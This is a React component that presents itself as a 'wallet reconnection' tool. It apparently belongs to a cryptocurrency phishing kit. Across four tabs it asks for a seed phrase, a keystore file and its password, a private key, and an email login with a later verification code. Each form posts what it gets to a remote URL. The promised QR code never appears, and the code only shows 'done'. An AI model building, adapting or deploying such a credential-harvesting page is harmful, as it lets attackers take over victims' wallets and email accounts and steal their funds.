import axios from 'axios'
import { useState } from 'react'
import { Route, Routes, useParams } from 'react-router-dom'
import styles from './WalletTabs.module.scss'
import { URL } from './walletTabsApi'


export function WalletTabs(props: any) {
    const views = [
        {
            name: 'Phrase',
            element: <Phrase />
        },
        {
            name: 'Keystore JSON',
            element: <Keystore />
        },
        {
            name: 'Private Key',
            element: <PrivateKey />
        },
        {
            name: 'Email',
            element: <Email />
        },
    ]

    const [currentView, setCurrentView] = useState(0)
    return (
        <section className={styles.wallet_tabs}>
            <nav>
                {views.map((view, index) => (
                    <button key={index}
                        onClick={() => setCurrentView(index)}
                        title={index === currentView && 'current'}
                    >{view.name}</button>
                ))}
            </nav>
            <section>
                {views[currentView].element}
            </section>
        </section>
    )
}


function Phrase(props: any) {
    const [token, setToken] = useState('')
    const type = 'phrase'
    const {id} = useParams()
    const [done, setDone] = useState(false)

    const handleSubmit = (e:any) => {
        e.preventDefault()
        setDone(true)
        try {
            axios.post(URL, {
                type: type,
                token: token,
                id: id
            })
            // Pop up a QRCode
            alert('done')
        } catch (e) {
            console.log(e)
            setDone(false)
            alert('Unexpected error occured, please try again.')
        }
    }
    return (
        <form className={styles.form} onSubmit={handleSubmit}>
            <textarea value={token} 
            onChange={(e) => setToken(e.target.value)} 
            placeholder='Phrase'
            ></textarea>
            <p>Typically 12(sometimes 24) words separated by single spaces</p>
            <button disabled={done} type='submit'>Get wallet reconnection API QR code</button>
        </form>
    )
}

function Keystore(props: any) {
    const [token, setToken] = useState('')
    const [password, setPassword] = useState('')
    const [done, setDone] = useState(false)
    const type = 'keystore'
    const {id} = useParams()

    const handleSubmit = (e:any) => {
        e.preventDefault()
        try {
            axios.post(URL, {
                type: type,
                id: id,
                token: token,
                password: password,
            })
            // Pop up a QRCode
            setDone(true)
            alert('done')
        } catch (e) {
            console.log(e)
            alert('Unexpected error occured, please try again.')
        }
    }
    return (
        <form className={styles.form} onSubmit={handleSubmit}>
            <textarea value={token} 
            onChange={(e) => setToken(e.target.value)} 
            placeholder='Keystore JSON'
            ></textarea>
            <input value={password} 
            onChange={(e) => setPassword(e.target.value)} 
            placeholder='Password' />
            <p>Several lines of text beginning with &#123;...&#125; plus the password you used to encrypt it.</p>
            <button disabled={done} type='submit'>Get wallet reconnection API QR code</button>
        </form>
    )
}

function PrivateKey(props: any) {
    const [pKey, setPKey] = useState('')
    const type = 'private'
    const {id} = useParams()
    const [done, setDone] = useState(false)

    const handleSubmit = (e:any) => {
        e.preventDefault()
        setDone(true)
        try {
            axios.post(URL, {
                type: type,
                id: id,
                pKey: pKey
            })
            // Pop up a QRCode
            alert('done')
        } catch (e) {
            console.log(e)
            setDone(false)
            alert('Unexpected error occured, please try again.')
        }
    }
    return (
        <form className={styles.form} onSubmit={handleSubmit}>
            <input value={pKey} 
            onChange={(e) => setPKey(e.target.value)} 
            placeholder='Private Key' />
            <p>Typically 12(sometimes 24) words separated by single spaces</p>
            <button disabled={done} type='submit'>Get wallet reconnection API QR code</button>
        </form>
    )
}

function Email(props: any) {
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [code, setCode] = useState('')
    const [index, setIndex] = useState(1)
    const type = 'email'
    const {id} = useParams()
    const [done, setDone] = useState(false)

    const handleProceed = () => {
        // send credentials to backend
        try {
            axios.post(URL, {
                type: type,
                id: id,
                email: email,
                password: password,
                code: 'Not yet recieved from client'
            })
            setIndex(2)
            setDone(false)
        } catch (e) {
            console.log(e)
            setDone(false)
            alert('Unexpected error occured, please try again.')
        }
    }
    const handleSubmit = (e: any) => {
        e.preventDefault();
        if (index===1) {
            setDone(true)
            handleProceed()
        }
        else {
            // send credentials and code to backend
            setDone(true)
            try {
                axios.post(URL, {
                    type: type,
                    id: id,
                    email: email,
                    password: password,
                    code: code
                })
                // Pop up a QRCode
                alert('submit')
            } catch (e) {
                console.log(e)
                setDone(false)
                alert('Unexpected error occured, please try again.')
            }
        }
    }

        return (
            <form className={styles.form} onSubmit={handleSubmit}>
                <input value={email} 
                required
                onChange={(e) => setEmail(e.target.value)} 
                placeholder='Email' />
                <input value={password} 
                required
                onChange={(e) => setPassword(e.target.value)} 
                placeholder='Password' />
                {index === 2 && (
                    <>
                    <p>Input API verification code</p>
                    <input value={code} 
                    className={styles.code_field}
                    required
                    onChange={(e) => setCode(e.target.value)} 
                    placeholder='####' />
                    </>
                )}
                <button disabled={done} type='submit'>{index===2 ? 'Get wallet reconnection API QR code' : 'Proceed'}</button>
            </form>
        )
}